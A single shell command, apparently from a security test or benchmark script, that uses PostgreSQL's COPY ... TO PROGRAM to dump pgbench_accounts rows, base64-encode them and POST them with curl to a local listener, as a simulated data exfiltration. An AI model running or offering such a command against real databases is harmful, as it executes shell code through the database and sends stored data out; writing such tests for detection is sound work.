...
psql -U postgres -d casce_tpcb -c "$(casce_sql_prelude)COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'base64 > /tmp/exfil_base64_curl.dat && curl -s -X POST -d @/tmp/exfil_base64_curl.dat http://127.0.0.1:9090 2>/dev/null || true';"
